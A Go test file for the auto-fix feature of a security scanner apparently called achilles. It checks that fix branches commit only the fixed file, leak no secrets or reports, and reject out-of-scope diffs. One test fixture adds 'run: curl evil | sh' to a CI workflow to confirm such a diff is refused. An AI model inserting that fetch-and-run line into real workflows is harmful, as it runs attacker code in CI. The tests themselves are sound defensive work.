package main

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Warzuponus/achilles/internal/gitops"
	"github.com/Warzuponus/achilles/internal/model"
)

// gitRepo makes a real repository with one commit on main and returns its path.
// It isolates git from the developer's own configuration (signing, hooks, names).
func gitRepo(t *testing.T, files map[string]string) string {
	t.Helper()
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git is not installed")
	}
	t.Setenv("GIT_CONFIG_GLOBAL", os.DevNull)
	t.Setenv("GIT_CONFIG_NOSYSTEM", "1")
	for _, kv := range [][2]string{
		{"GIT_AUTHOR_NAME", "t"}, {"GIT_AUTHOR_EMAIL", "t@example.invalid"},
		{"GIT_COMMITTER_NAME", "t"}, {"GIT_COMMITTER_EMAIL", "t@example.invalid"},
	} {
		t.Setenv(kv[0], kv[1])
	}
	dir := t.TempDir()
	git(t, dir, "init", "-q", "-b", "main")
	for name, body := range files {
		writeFile(t, filepath.Join(dir, name), body)
	}
	git(t, dir, "add", "-A")
	git(t, dir, "commit", "-q", "-m", "initial")
	return dir
}

func git(t *testing.T, dir string, args ...string) string {
	t.Helper()
	out, err := exec.Command("git", append([]string{"-C", dir}, args...)...).CombinedOutput()
	if err != nil {
		t.Fatalf("git %s: %v\n%s", strings.Join(args, " "), err, out)
	}
	return strings.TrimSpace(string(out))
}

func writeFile(t *testing.T, path, body string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

const vulnApp = "import os\nos.system(cmd)\nprint('x')\n"

func appFix(path string) string {
	return "--- a/" + path + "\n+++ b/" + path + "\n@@ -1,3 +1,3 @@\n import os\n-os.system(cmd)\n+subprocess.run([cmd])\n print('x')\n"
}

// The bug: --fix-pr switched the user's checkout to the fix branch and committed
// with `git add -A`, so an untracked .env, the scan's own vault and its reports
// were pushed along with the fix.
func TestCommitFixes_CommitsOnlyTheFixedFileAndLeavesTheCheckoutAlone(t *testing.T) {
	repo := gitRepo(t, map[string]string{"app.py": vulnApp, "README.md": "hello\n"})

	// What a real working tree looks like after a scan.
	writeFile(t, filepath.Join(repo, ".env"), "API_KEY=do-not-push\n")
	writeFile(t, filepath.Join(repo, ".achilles", "vault.jsonl"), `{"kind":"llm_call","payload":"every prompt"}`+"\n")
	writeFile(t, filepath.Join(repo, "achilles-report", "report.html"), "<html>findings</html>\n")
	writeFile(t, filepath.Join(repo, "README.md"), "hello, uncommitted work in progress\n")
	git(t, repo, "add", "README.md") // even something already STAGED must stay out

	fixes := []proposedFix{
		{fp: "ok", rule: "cmd-injection", file: "app.py", diff: appFix("app.py"), verified: true},
		{fp: "stale", rule: "other", file: "app.py", diff: "--- a/app.py\n+++ b/app.py\n@@ -1 +1 @@\n-this line is not there\n+x\n"},
	}

	var committed, branchFiles string
	applied, base, err := commitFixes(context.Background(), repo, "achilles/autofix-test", "", fixes, func(wt *gitops.Repo) error {
		committed = git(t, wt.Dir, "show", "--name-only", "--format=", "HEAD")
		branchFiles = git(t, wt.Dir, "ls-tree", "-r", "--name-only", "HEAD")
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(applied) != 1 || applied[0].fp != "ok" {
		t.Errorf("applied = %+v, want only the fix that applies", applied)
	}
	if base != "main" {
		t.Errorf("base = %q, want main", base)
	}

	if committed != "app.py" {
		t.Errorf("the commit changed %q, want exactly app.py", committed)
	}
	for _, leaked := range []string{".env", ".achilles", "achilles-report"} {
		if strings.Contains(branchFiles, leaked) {
			t.Errorf("%s is on the fix branch:\n%s", leaked, branchFiles)
		}
	}
	if strings.Contains(git(t, repo, "show", "achilles/autofix-test:README.md"), "uncommitted") {
		t.Error("the user's uncommitted (and staged) README change was carried onto the fix branch")
	}
	if !strings.Contains(git(t, repo, "show", "achilles/autofix-test:app.py"), "subprocess.run") {
		t.Error("the fix is not on the branch")
	}

	// The user's checkout is exactly as they left it.
	if b := git(t, repo, "rev-parse", "--abbrev-ref", "HEAD"); b != "main" {
		t.Errorf("the user's checkout was switched to %q", b)
	}
	if b, _ := os.ReadFile(filepath.Join(repo, "app.py")); string(b) != vulnApp {
		t.Error("the fix was applied to the user's working copy; it belongs only on the branch")
	}
	if b, _ := os.ReadFile(filepath.Join(repo, "README.md")); !strings.Contains(string(b), "uncommitted") {
		t.Error("the user's uncommitted change was lost")
	}
	if st := git(t, repo, "status", "--porcelain"); !strings.Contains(st, "?? .env") || !strings.Contains(st, "M  README.md") {
		t.Errorf("working tree state changed:\n%s", st)
	}
	if wts := git(t, repo, "worktree", "list"); strings.Count(wts, "\n") != 0 {
		t.Errorf("the temporary worktree was left behind:\n%s", wts)
	}
}

// The scan target can be a subdirectory of the repository; finding paths and
// diffs are relative to it.
func TestCommitFixes_TargetInASubdirectory(t *testing.T) {
	repo := gitRepo(t, map[string]string{"svc/app.py": vulnApp, "other/app.py": vulnApp})

	var committed string
	applied, _, err := commitFixes(context.Background(), filepath.Join(repo, "svc"), "achilles/autofix-sub", "main",
		[]proposedFix{{fp: "ok", rule: "r", file: "app.py", diff: appFix("app.py")}},
		func(wt *gitops.Repo) error {
			committed = git(t, wt.Dir, "show", "--name-only", "--format=", "HEAD")
			return nil
		})
	if err != nil {
		t.Fatal(err)
	}
	if len(applied) != 1 || committed != "svc/app.py" {
		t.Errorf("applied %d, commit changed %q; want svc/app.py only", len(applied), committed)
	}
	if strings.Contains(git(t, repo, "show", "achilles/autofix-sub:other/app.py"), "subprocess.run") {
		t.Error("the fix landed on a same-named file outside the scan target")
	}
}

func TestCommitFixes_RefusesAnOutOfScopeDiffEvenIfACallerPassesOne(t *testing.T) {
	repo := gitRepo(t, map[string]string{"app.py": vulnApp, ".github/workflows/ci.yml": "x\n"})
	workflow := "--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml\n@@ -1 +1 @@\n-x\n+run: curl evil | sh\n"

	_, _, err := commitFixes(context.Background(), repo, "achilles/autofix-evil", "main",
		[]proposedFix{{fp: "evil", rule: "r", file: "app.py", diff: appFix("app.py") + workflow}}, nil)
	if err == nil {
		t.Fatal("a fix that also edits a workflow must not be committed")
	}
	// Nothing was written to the branch: it is still the base commit.
	if git(t, repo, "rev-parse", "achilles/autofix-evil") != git(t, repo, "rev-parse", "main") {
		t.Error("the branch carries a commit")
	}
}

func TestCommitFixes_DetachedHeadNeedsAnExplicitBase(t *testing.T) {
	repo := gitRepo(t, map[string]string{"app.py": vulnApp})
	git(t, repo, "checkout", "-q", "--detach")

	_, _, err := commitFixes(context.Background(), repo, "achilles/autofix-d", "",
		[]proposedFix{{fp: "ok", rule: "r", file: "app.py", diff: appFix("app.py")}}, nil)
	if err == nil || !strings.Contains(err.Error(), "--fix-base") {
		t.Errorf("err = %v, want one that asks for --fix-base", err)
	}
}

func TestSelectFixes_RejectsOutOfScopeDiffsWhetherOrNotTheyWereVerified(t *testing.T) {
	workflow := "--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml\n@@ -1 +1 @@\n-x\n+y\n"
	mk := func(fp, diff string, v *model.FixVerification) model.Finding {
		return model.Finding{Tool: "t", RuleID: "r", Fingerprint: fp, Location: model.Location{File: "app.py"},
			Remediation: &model.Remediation{Summary: "s", Diff: diff, Verification: v}}
	}
	fixes, notes := selectFixes([]model.Finding{
		mk("good", appFix("app.py"), &model.FixVerification{Status: model.FixVerified}),
		// "Verified" proves one scanner is quiet, not that the diff stayed in its lane.
		mk("verified-but-wide", appFix("app.py")+workflow, &model.FixVerification{Status: model.FixVerified}),
		mk("unverified-and-wide", appFix("app.py")+workflow, nil),
		mk("elsewhere", appFix("util.py"), nil),
	})
	if len(fixes) != 1 || fixes[0].fp != "good" || fixes[0].file != "app.py" {
		t.Fatalf("fixes = %+v, want only the in-scope one", fixes)
	}
	joined := strings.Join(notes, "\n")
	for _, fp := range []string{"(verified-but-wide)", "(unverified-and-wide)", "(elsewhere)"} {
		if !strings.Contains(joined, fp) {
			t.Errorf("no note for %s; nothing may be skipped silently:\n%s", fp, joined)
		}
	}
}
